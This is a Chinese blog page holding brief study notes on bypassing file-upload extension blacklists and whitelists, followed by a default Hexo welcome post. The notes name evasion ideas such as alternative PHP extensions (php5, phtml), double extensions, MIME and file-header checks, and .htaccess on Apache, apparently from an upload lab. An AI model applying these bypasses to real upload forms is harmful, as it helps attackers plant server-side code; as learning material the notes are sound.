<h2 id="文件上传黑名单-白名单绕过"><a href="#文件上传黑名单-白名单绕过" class="headerlink" title="文件上传黑名单&#x2F;白名单绕过"></a>文件上传黑名单&#x2F;白名单绕过</h2><p>后缀名</p>
<p>黑名单：明确不让上传的的格式后缀</p>
<p>asp,php,jsp,cgi,war</p>
<p>缺陷：规定不明确容易被绕过，如php5,phtml</p>
<p>白名单：明确可以上传的格式后缀</p>
<p>jpg,png,zip,rar,gif</p>
<p>文件类型：mime</p>
<p>上传相关文件，会自带一个信息（就是下图content-type）</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905145204409.png" alt="image-20230905145204409"></p>
<p>文件头</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905145505436.png" alt="image-20230905145505436"></p>
<p>(png头部)</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905145534361.png" alt="image-20230905145534361"></p>
<p>（GIF头部）</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905150156044.png" alt="image-20230905150156044"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905152600429.png" alt="image-20230905152600429"></p>
<p>pass2白名单</p>
<p>pass3黑名单</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905152511133.png" alt="image-20230905152511133"></p>
<p>php_trim 去除空白符</p>
<p>deldot删除文件命末尾的点</p>
<p>（防止1.jpg.php，这种形式会判断成jpg实际上传时php）</p>
<p>strrchr 分割（abcd，b）表示从b开始分割</p>
<h3 id="php格式执行"><a href="#php格式执行" class="headerlink" title="php格式执行"></a>php格式执行</h3><p>这是一种黑名单绕过 ，相当是用其他格式</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230906084734626.png" alt="image-20230906084734626"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230906084751993.png" alt="image-20230906084751993"></p>
<p> <img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230906085052021.png" alt="image-20230906085052021"></p>
<p>.htaccess只有apache能用</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/06/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/dongman2.jpg">
      <meta itemprop="name" content="花少">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="蔚蓝星">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/06/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-09-06 12:52:13" itemprop="dateCreated datePublished" datetime="2023-09-06T12:52:13+08:00">2023-09-06</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="花少"
      src="/images/dongman2.jpg">
  <p class="site-author-name" itemprop="name">花少</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">2</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2023-09 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">花少</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>
    <script defer src="/lib/three/three-waves.min.js"></script>


  















  

  

</body>
</html>
